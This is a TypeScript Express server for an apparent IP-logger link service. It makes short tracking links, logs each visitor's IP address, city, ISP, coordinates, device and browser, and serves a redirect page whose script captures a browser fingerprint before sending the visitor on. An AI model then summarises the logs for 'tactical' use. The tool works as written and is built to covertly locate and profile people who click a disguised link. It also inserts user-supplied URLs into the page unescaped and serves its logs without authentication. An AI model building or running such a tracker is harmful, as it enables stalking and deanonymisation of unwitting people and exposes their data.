import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { nanoid } from 'nanoid';
import useragent from 'express-useragent';
import axios from 'axios';
import cors from 'cors';

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(cors());
  app.use(express.json());
  app.use(useragent.express());

  // In-memory storage for logs and targets
  const logs: any[] = [];
  const targets: Map<string, string> = new Map();

  // API Routes
  app.post('/api/generate', (req, res) => {
    const { targetUrl } = req.body;
    if (!targetUrl) {
      return res.status(400).json({ error: 'Target URL is required' });
    }
    const id = nanoid(8);
    targets.set(id, targetUrl);
    res.json({ id, trackingUrl: `${process.env.APP_URL || `http://localhost:${PORT}`}/v/${id}` });
  });

  app.get('/api/logs', (req, res) => {
    res.json(logs);
  });

  // AI Analysis Endpoint
  app.post('/api/analyze-threat', async (req, res) => {
    const { logEntry } = req.body;
    if (!logEntry) return res.status(400).json({ error: 'Log entry required' });

    try {
      const { GoogleGenAI } = await import('@google/genai');
      const genAI = new GoogleGenAI(process.env.GEMINI_API_KEY || '');
      const model = genAI.getGenerativeModel({ model: 'gemini-1.5-flash' });

      const prompt = `Analyze this visitor log for potential security threats or interesting patterns. 
      Visitor Data: ${JSON.stringify(logEntry)}
      Provide a concise, tactical summary in 2-3 sentences. Focus on IP reputation, device anomalies, or geographic context. 
      Format: [ANALYSIS] <your summary>`;

      const result = await model.generateContent(prompt);
      const response = await result.response;
      res.json({ analysis: response.text() });
    } catch (error) {
      console.error('AI Analysis failed:', error);
      res.status(500).json({ error: 'AI analysis failed. Ensure GEMINI_API_KEY is set.' });
    }
  });

  // Endpoint to receive JS fingerprint data
  app.post('/api/log-fingerprint', (req, res) => {
    const { id, fingerprint, timestamp } = req.body;
    // Find the log entry for this ID and timestamp (or just the latest one for this ID)
    const logIndex = logs.findIndex(l => l.id === id && !l.fingerprint);
    if (logIndex !== -1) {
      logs[logIndex].fingerprint = fingerprint;
      // Update location if timezone is provided and location is still 'Unknown' or generic
      if (fingerprint.timezone && logs[logIndex].location === 'Unknown') {
        logs[logIndex].location = `TZ: ${fingerprint.timezone}`;
      }
    }
    res.sendStatus(200);
  });

  // Redirection Route
  app.get('/v/:id', async (req, res) => {
    const id = req.params.id;
    const targetUrl = targets.get(id);

    if (!targetUrl) {
      return res.status(404).send('Target not found');
    }

    // Log tracking data
    const xForwardedFor = req.headers['x-forwarded-for'];
    const ip = Array.isArray(xForwardedFor) 
      ? xForwardedFor[0] 
      : xForwardedFor?.split(',')[0].trim() || req.socket.remoteAddress;
    
    const ua = req.useragent;

    let location = 'Unknown';
    let isp = 'Unknown';
    let lat = 0;
    let lon = 0;
    try {
      if (ip && ip !== '::1' && ip !== '127.0.0.1' && !ip.startsWith('10.') && !ip.startsWith('172.')) {
        const geoResponse = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,as,query,lat,lon`);
        if (geoResponse.data.status === 'success') {
          location = `${geoResponse.data.city}, ${geoResponse.data.regionName}, ${geoResponse.data.country}`;
          isp = geoResponse.data.isp;
          lat = geoResponse.data.lat;
          lon = geoResponse.data.lon;
        }
      }
    } catch (error) {
      console.error('Geo lookup failed:', error);
    }

    const logEntry = {
      timestamp: new Date().toISOString(),
      ipAddress: ip,
      location,
      isp,
      lat,
      lon,
      device: `${ua?.platform} ${ua?.os}`,
      browser: ua?.browser,
      id,
      fingerprint: null
    };

    logs.unshift(logEntry);
    if (logs.length > 100) logs.pop();

    // Serve a tactical redirection page to capture JS fingerprint
    res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>REDIRECTING...</title>
        <style>
          body { background: #131313; color: #00ff41; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
          .terminal { border: 1px solid #353534; padding: 20px; position: relative; }
          .terminal::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: #00ff41; animation: scan 2s linear infinite; }
          @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
          .cursor { display: inline-block; width: 10px; height: 18px; background: #00ff41; animation: blink 1s infinite; vertical-align: middle; }
          @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
        </style>
      </head>
      <body>
        <div class="terminal">
          [SYSTEM] INITIATING_SECURE_REDIRECT...<br>
          [STATUS] CAPTURING_FINGERPRINT...<br>
          [TARGET] ${id}<br>
          <span id="progress"></span><span class="cursor"></span>
        </div>
        <script>
          const data = {
            id: "${id}",
            timestamp: "${logEntry.timestamp}",
            fingerprint: {
              screen: screen.width + "x" + screen.height,
              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
              language: navigator.language,
              platform: navigator.platform,
              cores: navigator.hardwareConcurrency,
              memory: navigator.deviceMemory
            }
          };

          fetch('/api/log-fingerprint', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
          }).finally(() => {
            setTimeout(() => {
              window.location.href = "${targetUrl}";
            }, 800);
          });

          let dots = "";
          setInterval(() => {
            dots = dots.length > 3 ? "" : dots + ".";
            document.getElementById("progress").innerText = "REDIRECTING" + dots;
          }, 200);
        </script>
      </body>
      </html>
    `);
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
